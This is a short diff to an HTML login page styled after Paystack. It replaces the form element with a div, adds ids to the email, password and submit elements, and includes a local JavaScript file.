@@ -13,20 +13,21 @@
 </head>
 
 <body>
-    <form class="loginform">
+    <div class="loginform">
         <div class="logo">
             <img src="./img/Paystack Logo.svg" alt="Paystack Logo">
             <h3>paystack</h3>
         </div>
         <div class="logindetails">
             <h5>LOGIN</h5>
-            <input type="email" name="Email" placeholder="Email address" required /> <br>
-            <input type="password" name="Password" placeholder="Password" required /> <br>
-            <button class="btnSubmit">Login to your account</button>
+            <input type="email" name="Email" placeholder="Email address" id="email" required /> <br>
+            <input type="password" name="Password" placeholder="Password" id="password" required /> <br>
+            <button class="btnSubmit" id="submitbtn">Login to your account</button>
 
         </div>
         <p> <small> New to paystack? Sign up <br> Forgot your password?</small></p>
-    </form>
+    </div>
+    <script src="./js/main.js"></script>
 </body>
 
 </html>
